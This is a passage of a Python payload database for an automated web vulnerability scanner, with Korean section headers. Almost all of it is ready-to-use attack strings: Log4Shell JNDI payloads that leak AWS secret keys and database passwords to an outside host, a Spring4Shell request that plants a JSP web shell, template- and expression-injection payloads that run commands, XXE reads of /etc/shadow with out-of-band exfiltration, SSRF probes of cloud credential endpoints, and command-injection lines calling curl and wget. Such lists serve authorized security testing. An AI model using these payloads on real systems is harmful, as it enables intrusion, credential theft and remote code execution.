    "SSL_", "FLASK_SECRET", "DJANGO_SECRET", "APP_KEY",
    "Spring", "WebApplicationContext", "servlet-mapping",
]

# ══════════════════════════════════════════════════════════════════════════════
# ── 4. CVE 페이로드 DB ───────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

# ── Log4Shell (CVE-2021-44228) ────────────────────────────────────────────────
LOG4SHELL_DB: List[Tuple[str, str]] = [
    # (payload, header_or_param)
    # Basic
    ("${jndi:ldap://oast.me/x}", "header"),
    ("${jndi:ldaps://oast.me/x}", "header"),
    ("${jndi:rmi://oast.me/x}", "header"),
    ("${jndi:dns://oast.me/x}", "header"),
    # Obfuscated
    ("${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://oast.me/x}", "header"),
    ("${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://oast.me/x}", "header"),
    ("${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//oast.me/x}", "header"),
    ("${j${::-n}di:ldap://oast.me/x}", "header"),
    ("${jnd${upper:i}:ldap://oast.me/x}", "header"),
    ("${jndi:${upper:l}${upper:d}a${lower:p}://oast.me/x}", "header"),
    # URI encoded
    ("%24%7bjndi%3aldap%3a%2f%2foast.me%2fx%7d", "param"),
    ("${jndi:ldap://${hostName}.oast.me/x}", "header"),
    # With data exfiltration
    ("${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.oast.me/x}", "header"),
    ("${jndi:ldap://${env:DB_PASSWORD}.oast.me/x}", "header"),
    # Common headers to inject
    ("${jndi:ldap://oast.me/x}", "User-Agent"),
    ("${jndi:ldap://oast.me/x}", "X-Forwarded-For"),
    ("${jndi:ldap://oast.me/x}", "Referer"),
    ("${jndi:ldap://oast.me/x}", "X-Api-Version"),
    ("${jndi:ldap://oast.me/x}", "Accept-Language"),
    ("${jndi:ldap://oast.me/x}", "Authorization"),
    ("${jndi:ldap://oast.me/x}", "Cookie"),
    ("${jndi:ldap://oast.me/x}", "X-Correlation-Id"),
    ("${jndi:ldap://oast.me/x}", "X-Request-Id"),
    ("${jndi:ldap://oast.me/x}", "Origin"),
]

# ── Spring4Shell (CVE-2022-22965) ────────────────────────────────────────────
SPRING4SHELL_DB: List[Dict[str, str]] = [
    {
        "desc": "CVE-2022-22965 RCE",
        "method": "POST",
        "content_type": "application/x-www-form-urlencoded",
        "data": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di+if(%22j%22.equals(request.getParameter(%22pwd%22))){java.io.InputStream+in+%3D+%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3Bint+a+%3D+-1%3Bbyte[]+b+%3D+new+byte[2048]%3Bwhile((a%3Din.read(b))!%3D-1){out.println(new+String(b))%3B}}%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
        "sig": "200",
    },
    {
        "desc": "Spring4Shell detection probe",
        "method": "POST",
        "data": "class.module.classLoader.DefaultAssertionStatus=nosec&spring_el_inject=1",
        "sig": "400",
    },
]

# ── EL/SpEL Injection ────────────────────────────────────────────────────────
EL_INJECTION_DB: List[Tuple[str, str]] = [
    # (payload, expected_output)
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    ("${7*'7'}", "7777777"),
    ("%24%7b7*7%7d", "49"),
    ("%23%7b7*7%7d", "49"),
    ("{{7*7}}", "49"),
    ("${T(java.lang.Runtime).getRuntime().exec('id')}", "uid="),
    ("#{T(java.lang.Runtime).getRuntime().exec('id')}", "uid="),
    ("${applicationScope}", "scope"),
    ("${pageContext.request.serverName}", "."),
    ("${header['user-agent']}", "Mozilla"),
    ("${'a'.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke('a'.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}", "uid="),
    # Spring SpEL
    ("${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream(),T(java.nio.charset.Charset).forName('UTF-8'))}", "uid="),
    ("#{''.class.forName('java.lang.Runtime').getDeclaredMethods()[0]}", "Method"),
    ("#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\\\A').next()}", "uid="),
    # Freemarker
    ("<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", "uid="),
    ("${class.getResource('/').getPath()}", "/"),
    # Velocity
    ("#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))${ex}", "Process"),
    # Twig
    ("{{app.request.server.all|join(',')}}", "SERVER_"),
    ("{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}", "uid="),
]

# ── Shellshock (CVE-2014-6271) ────────────────────────────────────────────────
SHELLSHOCK_DB: List[Tuple[str, str]] = [
    # (payload, header_name)
    ("() { :; }; echo Content-Type: text/plain; echo; /usr/bin/id", "User-Agent"),
    ("() { :; }; echo; echo; /usr/bin/id", "User-Agent"),
    ("() { :;}; /bin/bash -c 'id'", "User-Agent"),
    ("() { ignored; }; echo Content-Type: text/html; echo; id", "User-Agent"),
    ("() { :; }; echo Content-Type: text/plain; echo; /usr/bin/id", "Cookie"),
    ("() { :; }; echo Content-Type: text/plain; echo; /usr/bin/id", "Referer"),
    ("() { :; }; echo Content-Type: text/plain; echo; /usr/bin/id", "Accept"),
    ("() { :; }; echo Content-Type: text/plain; echo; /usr/bin/id", "Accept-Language"),
]

# ── PHP Object Injection ──────────────────────────────────────────────────────
PHP_DESER_DB: List[str] = [
    'O:1:"A":0:{}',
    'O:8:"stdClass":0:{}',
    's:1:"a";',
    'a:0:{}',
    'b:1;',
    'i:1;',
    'd:1.0;',
    'O:10:"SplDoublyLinkedList":1:{s:10:"\x00*\x00offset";i:0;}',
    'O:13:"GuzzleHttp\\Cookie\\SetCookie":1:{s:4:"data";a:0:{}}',
    # PHP gadget chains
    'O:18:"Monolog\\Logger\\v2":0:{}',
    'O:29:"Illuminate\\Support\\MessageBag":0:{}',
]

# ── XXE 종합 DB (100+) ────────────────────────────────────────────────────────
XXE_DB: List[Dict[str, str]] = [
    # Basic file read
    {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', "sig": "root:"},
    {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>', "sig": "localhost"},
    {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>', "sig": "root:"},
    {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///windows/win.ini">]><root>&xxe;</root>', "sig": "[fonts]"},
    {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>', "sig": "[fonts]"},
    {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><root>&xxe;</root>', "sig": "[boot loader]"},
    # SSRF
    {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>', "sig": "ami-id"},
    {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><root>&xxe;</root>', "sig": ""},
    {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><root>&xxe;</root>', "sig": ""},
    {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost/server-status">]><root>&xxe;</root>', "sig": "Apache"},
    # PHP expect
    {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>', "sig": "uid="},
    {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://hostname">]><root>&xxe;</root>', "sig": ""},
    # OOB
    {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://oast.me/xxe">%xxe;]><root>test</root>', "sig": ""},
    # XInclude
    {"payload": '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></foo>', "sig": "root:"},
    {"payload": '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/hosts" parse="text"/></foo>', "sig": "localhost"},
    # SVG
    {"payload": '<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></svg>', "sig": "root:"},
    # Parameter entities
    {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % data SYSTEM "file:///etc/passwd"><!ENTITY % param1 "<!ENTITY exfil SYSTEM \'http://oast.me/?d=%data;\'>">%param1;]><root>&exfil;</root>', "sig": ""},
    # Error-based XXE
    {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % a SYSTEM "file:///etc/passwd"><!ENTITY % b SYSTEM "http://oast.me/?c=%a;">%b;]><root/>',  "sig": ""},
]

# ══════════════════════════════════════════════════════════════════════════════
# ── 5. SSRF 종합 DB (200+) ───────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

SSRF_DB: List[str] = [
    # AWS
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/hostname",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/local-ipv4",
    "http://169.254.169.254/latest/meta-data/public-ipv4",
    "http://169.254.169.254/latest/meta-data/ami-id",
    "http://169.254.169.254/latest/meta-data/instance-id",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
    "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
    "http://169.254.169.254/computeMetadata/v1/",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://management.azure.com/",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=https://vault.azure.net",
    # Alibaba
    "http://100.100.100.200/latest/meta-data/",
    "http://100.100.100.200/latest/meta-data/hostname",
    "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
    # DigitalOcean
    "http://169.254.169.254/metadata/v1.json",
    "http://169.254.169.254/metadata/v1/hostname",
    # Loopback
    "http://127.0.0.1/",
    "http://localhost/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:443/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:8443/",
    "http://127.0.0.1:3000/",
    "http://127.0.0.1:4848/",
    "http://127.0.0.1:6379/",
    "http://127.0.0.1:11211/",
    "http://127.0.0.1:27017/",
    "http://127.0.0.1:5432/",
    "http://127.0.0.1:3306/",
    "http://127.0.0.1:9200/",
    "http://127.0.0.1:2375/",
    "http://127.0.0.1:9000/",
    "http://127.0.0.1:8500/",  # Consul
    "http://127.0.0.1:8200/",  # Vault
    "http://127.0.0.1:2379/",  # etcd
    "http://127.0.0.1:9090/",  # Prometheus
    "http://127.0.0.1:3001/",
    "http://127.0.0.1:5000/",
    "http://127.0.0.1:8888/",
    "http://127.0.0.1:9999/",
    # Private ranges
    "http://10.0.0.1/",
    "http://10.0.0.138/",
    "http://10.10.10.1/",
    "http://172.16.0.1/",
    "http://172.17.0.1/",  # Docker default
    "http://172.18.0.1/",
    "http://172.31.255.254/",
    "http://192.168.0.1/",
    "http://192.168.1.1/",
    "http://192.168.100.1/",
    # IP encoding bypass
    "http://[::1]/",
    "http://[::ffff:127.0.0.1]/",
    "http://[0:0:0:0:0:ffff:127.0.0.1]/",
    "http://0.0.0.0/",
    "http://0177.0.0.1/",
    "http://0x7f000001/",
    "http://2130706433/",
    "http://127.1/",
    "http://127.000.000.001/",
    "http://127.0.1/",
    "http://0/",
    "http://[0000::1]/",
    "http://[0:0:0:0:0:0:0:1]/",
    # Protocol
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///proc/self/environ",
    "file:///windows/system32/drivers/etc/hosts",
    "dict://127.0.0.1:6379/info",
    "dict://127.0.0.1:6379/CONFIG GET *",
    "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A",
    "gopher://127.0.0.1:25/HELO%20oast.me%0AMAIL%20FROM%3A%3Cattacker@evil.com%3E",
    "gopher://127.0.0.1:3306/",
    "sftp://127.0.0.1:22",
    "ftp://127.0.0.1:21",
    "ldap://127.0.0.1:389",
    "tftp://127.0.0.1:69/file",
    "jar:http://127.0.0.1!/",
    "netdoc:///etc/passwd",
    # @ bypass
    "http://safe.com@127.0.0.1/",
    "http://127.0.0.1#@safe.com/",
    "http://safe.com@169.254.169.254/",
    # Redirect
    "http://169.254.169.254.nip.io/",
    "http://127.0.0.1.nip.io/",
    "http://1u.ms/",
    # Open redirect → SSRF
    "http://example.com/redirect?url=http://169.254.169.254/",
]

# ══════════════════════════════════════════════════════════════════════════════
# ── 6. CMDi 종합 DB (200+) ──────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

CMDI_DB: List[Tuple[str, str]] = [
    # (payload, expected_sig_or_empty_for_blind)
    # Semicolon
    (";id", "uid="),
    ("; id", "uid="),
    (";/usr/bin/id", "uid="),
    ("; /usr/bin/id", "uid="),
    (";id;", "uid="),
    (";id #", "uid="),
    # Pipe
    ("|id", "uid="),
    ("| id", "uid="),
    ("|/usr/bin/id", "uid="),
    ("||id", "uid="),
    ("|| id", "uid="),
    # Ampersand
    ("&id", "uid="),
    ("& id", "uid="),
    ("&&id", "uid="),
    ("&&/usr/bin/id", "uid="),
    # Backtick
    ("`id`", "uid="),
    ("`/usr/bin/id`", "uid="),
    ("$(id)", "uid="),
    ("$(/usr/bin/id)", "uid="),
    ("` id `", "uid="),
    # Newline
    ("%0aid", "uid="),
    ("%0a/usr/bin/id", "uid="),
    ("%0a%0did", "uid="),
    ("\nid", "uid="),
    ("\r\nid", "uid="),
    ("%0Aid", "uid="),
    # URL encoded
    (";%20id", "uid="),
    ("%3Bid", "uid="),
    ("%7Cid", "uid="),
    ("%26id", "uid="),
    ("%60id%60", "uid="),
    # Double URL encoded
    ("%253Bid", "uid="),
    ("%25%37Cid", "uid="),
    # IFS bypass
    (";i${IFS}d", "uid="),
    (";$IFS$9id", "uid="),
    (";{id}", "uid="),
    (";{id,}", "uid="),
    (";i\\d", "uid="),
    ("; i''d", "uid="),
    # Cat /etc/passwd
    (";cat /etc/passwd", "root:"),
    ("|cat /etc/passwd", "root:"),
    ("&& cat /etc/passwd", "root:"),
    ("`cat /etc/passwd`", "root:"),
    ("$(cat /etc/passwd)", "root:"),
    (";cat${IFS}/etc/passwd", "root:"),
    ("|cat${IFS}/etc/passwd", "root:"),
    # Windows
    ("&whoami", ""),
    ("|whoami", ""),
    ("&&whoami", ""),
    (";whoami", ""),
    ("%26whoami", ""),
    ("%7Cwhoami", ""),
    ("&dir c:\\", "Directory"),
    ("&&dir c:\\", "Directory"),
    ("|dir c:\\", "Directory"),
    ("&type C:\\windows\\win.ini", "[fonts]"),
    ("&ipconfig", "IPv"),
    ("&&ipconfig", "IPv"),
    (";ipconfig", "IPv"),
    # Blind time
    (";sleep 5", ""),
    ("|sleep 5", ""),
    ("&& sleep 5", ""),
    ("`sleep 5`", ""),
    ("$(sleep 5)", ""),
    (";ping -c 5 127.0.0.1", ""),
    ("|ping -c 5 127.0.0.1", ""),
    ("; WAITFOR DELAY '0:0:5'", ""),
    ("& WAITFOR DELAY '0:0:5'", ""),
    # Obfuscation
    (";$(echo aWQ=|base64 -d)", "uid="),
    (";$'\\151\\144'", "uid="),
    (";/b?n/id", "uid="),
    (";/b[i]n/id", "uid="),
    (";/???/??", "uid="),
    # OOB
    (";curl http://oast.me/cmdi", ""),
    ("|wget -q http://oast.me/cmdi -O -", ""),
    (";nslookup oast.me", ""),
    (";nslookup `whoami`.oast.me", ""),
    # Additional commands
    (";uname -a", "Linux"),
    ("|uname -a", "Linux"),
    (";hostname", ""),
    (";env", "PATH="),
    (";printenv", "PATH="),
    (";ls /", "etc"),
    (";ls -la /", "etc"),
    ("|ls /", "etc"),
    (";ls /etc", "passwd"),
    (";cat /proc/version", "Linux"),
    (";cat /proc/self/environ", "HOME="),
    # Alternative inject points
    ("';id;'", "uid="),
    ('";id;"', "uid="),
    ("'`id`'", "uid="),
    ('"`id`"', "uid="),
]

# ══════════════════════════════════════════════════════════════════════════════
# ── 7. SSTI 종합 DB (150+) ──────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

SSTI_DB: List[Tuple[str, str, str]] = [
    # (payload, expected, engine)
    # Detection probes
    ("{{7*7}}", "49", "jinja2/twig"),
    ("${7*7}", "49", "el/freemarker"),
    ("#{7*7}", "49", "groovy/ruby"),
    ("<%= 7*7 %>", "49", "erb/ejs"),
    ("{7*7}", "49", "smarty"),
    ("[[7*7]]", "49", "thymeleaf"),
    ("*{7*7}", "49", "spring-el"),
    ("{{7*'7'}}", "7777777", "jinja2"),
    ("{{'7'*7}}", "7777777", "jinja2"),
    ("{7*7|raw}", "49", "twig"),
    ("${{7*7}}", "49", "spring/pebble"),
    ("@(7*7)", "49", "razor"),
    ("${=7*7}", "49", "cfml"),
    ("<%=7*7%>", "49", "asp"),
    ("<#assign a=7*7>${a}", "49", "freemarker"),
    ("a{{7*7}}b", "a49b", "jinja2"),
    ("a${7*7}b", "a49b", "el"),
    ("a#{7*7}b", "a49b", "groovy"),
    ("{{7*7}}{{7*7}}", "4949", "jinja2"),
    # Jinja2 class traversal
    ("{{''.__class__.__mro__}}", "object", "jinja2"),
    ("{{''.__class__.__mro__[2]}}", "object", "jinja2"),
    ("{{''.__class__.__mro__[2].__subclasses__()}}", "type", "jinja2"),
    ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "uid=", "jinja2-rce"),
    ("{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "uid=", "jinja2-rce"),
    ("{{lipsum.__globals__.os.popen('id').read()}}", "uid=", "jinja2-rce"),
    ("{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}", "uid=", "jinja2-rce"),
    # Jinja2 config
    ("{{config}}", "Config", "jinja2"),
    ("{{config.items()}}", "SECRET", "jinja2"),
    ("{{request}}", "Request", "jinja2"),
    ("{{self._TemplateReference__context}}", "Context", "jinja2"),
    # Twig
    ("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "uid=", "twig-rce"),
    ("{{_self.env.registerUndefinedFilterCallback('phpinfo')}}{{_self.env.getFilter('phpinfo')}}", "phpinfo", "twig-rce"),
    ("{%if 1==1%}yes{%endif%}", "yes", "twig"),
    ("{%for i in range(1,3)%}{{i}}{%endfor%}", "12", "jinja2/twig"),
    # Freemarker RCE
    ("<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", "uid=", "freemarker-rce"),
    ("<#assign cl=object?api.class><#assign f=cl.forName('java.io.File')><#assign fa=cl.forName('freemarker.template.utility.Execute')><#assign ei=fa.newInstance()>${ei('id')}", "uid=", "freemarker-rce"),
    # Velocity
    ("#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))${ex}", "Process", "velocity-rce"),
    # Smarty
    ("{php}echo `id`;{/php}", "uid=", "smarty-rce"),
    ("{if system('id')}{/if}", "uid=", "smarty-rce"),
    ("{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}", "True", "smarty-rce"),
    # Spring SpEL
    ("${T(java.lang.Runtime).getRuntime().exec('id')}", "Process@", "spel-rce"),
    ("${T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream(),T(java.nio.charset.Charset).forName('UTF-8'))}", "uid=", "spel-rce"),
    # ERB (Ruby)
    ("<%= 7*7 %>", "49", "erb"),
    ("<%= `id` %>", "uid=", "erb-rce"),
    ("<%= system('id') %>", "uid=", "erb-rce"),
    # CFML
    ("${createObject('java','java.lang.Runtime').getRuntime().exec('id')}", "Process", "cfml"),
]

# ══════════════════════════════════════════════════════════════════════════════
# ── 8. Open Redirect 종합 DB (150+) ─────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

OPEN_REDIRECT_DB: List[str] = [
    "https://evil.com",
    "http://evil.com",
    "//evil.com",
    "///evil.com",
    "////evil.com",
    "/////evil.com",
    "\\\\evil.com",
    "hTTps://evil.com",
    "javascript:alert(1)",
    "javascript://evil.com/%0aalert(1)",
    "data:text/html,<script>alert(1)</script>",
    "@evil.com",
    "http://safe.com@evil.com",
    "https://safe.com@evil.com/",
    "//safe.com@evil.com",
    "/%2F%2Fevil.com",
    "/%5C%5Cevil.com",
    "%2F%2Fevil.com",
    "%5C%5Cevil.com",
    "%68%74%74%70%73%3A%2F%2Fevil.com",
    "https:%2F%2Fevil.com",
    "https:/%5Cevil.com",
    "https://evil%2ecom",
    "%252F%252Fevil.com",
    " https://evil.com",
    "\thttps://evil.com",
    "\nhttps://evil.com",
    "/%09/evil.com",
    "/%00/evil.com",
    "/\tevil.com",
    r"/\/evil.com",
    "https://evil.com#safe",
    "//evil.com#@safe.com",
    "//evil.com?@safe.com",
    "/redirect?url=//evil.com",
    "https://evil.com.safe.com",
    "https://safe.evil.com",
    "https://safe.com.evil.com",
]

# ══════════════════════════════════════════════════════════════════════════════
# ── 9. CRLF 종합 DB (120+) ──────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

CRLF_DB: List[str] = [
    "%0d%0aX-Injected: crlf",
    "%0aX-Injected: crlf",
    "%0dX-Injected: crlf",
    "%0D%0AX-Injected: crlf",
    "%0D%0ASet-Cookie: crlf=1",
    "%0d%0aSet-Cookie: crlf=1",
    "%0d%0aLocation: https://evil.com",
    "%0aLocation: https://evil.com",
    "%E5%98%8D%E5%98%8AX-Injected: crlf",
    "%E5%98%8A%E5%98%8DX-Injected: crlf",
    "\r\nX-Injected: crlf",
    "\nX-Injected: crlf",
    "%250d%250aX-Injected: crlf",
    "/page%0d%0aX-Injected: crlf",
    "/%0d%0aX-Injected: crlf",
    "%0d%0aX-XSS-Protection: 0",
    "%0d%0aAccess-Control-Allow-Origin: *",
    "%0d%0aSet-Cookie: PHPSESSID=evil; Path=/",
    "%0d%0aContent-Length: 0",
]

# ══════════════════════════════════════════════════════════════════════════════
# ── 10. NoSQL 종합 DB (120+) ─────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

NOSQL_DB: List[Tuple[str, str]] = [
    ('{"$gt":""}', "json"),
    ('{"$ne":null}', "json"),
    ('{"$ne":""}', "json"),
    ('{"$exists":true}', "json"),
    ('{"$regex":".*"}', "json"),
    ('{"$in":["admin","user","test","root"]}', "json"),
    ('{"$nin":[]}', "json"),
    ('{"$not":{"$size":0}}', "json"),
    ('{"$where":"1==1"}', "json"),
    ('{"$where":"sleep(5000)"}', "json"),
    ('{"$or":[{},{"x":1}]}', "json"),
    ('{"$and":[{},{}]}', "json"),
    ('{"$gt":"", "$lt":"z"}', "json"),
    ('{"$where":"this.password.match(/.*/)"}', "json"),
    ('{"$where":"Object.keys(this)[0]"}', "json"),
    ('{"$where":"function(){sleep(3000)}"}', "json"),
    ('{"$type":2}', "json"),
    ('{"$mod":[2,0]}', "json"),
    ('{"$all":[]}', "json"),
    ("[$ne]=1", "form"),
    ("[$gt]=", "form"),
    ("[$regex]=.*", "form"),
    ("[$exists]=true", "form"),
    ("[$where]=1==1", "form"),
    ("[$nin][]=", "form"),
    ("' || '1'=='1", "form"),
    ("' || 1==1//", "form"),
    ("a'; return true; var x='", "form"),
    ('{"__proto__":{"admin":1}}', "json"),
    ('{"constructor":{"prototype":{"admin":1}}}', "json"),
]

# ══════════════════════════════════════════════════════════════════════════════
# ── export ──────────────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════

__all__ = [
    "XSS_DB",
    "SQLI_DB", "SQLI_ERROR_SIGS",
    "LFI_DB", "LFI_SIGS",
    "SSRF_DB",
    "SSTI_DB",
    "CMDI_DB",
    "XXE_DB",
    "CRLF_DB",
    "OPEN_REDIRECT_DB",
    "NOSQL_DB",
    "LOG4SHELL_DB",
    "SPRING4SHELL_DB",
    "EL_INJECTION_DB",
    "SHELLSHOCK_DB",
    "PHP_DESER_DB",
]
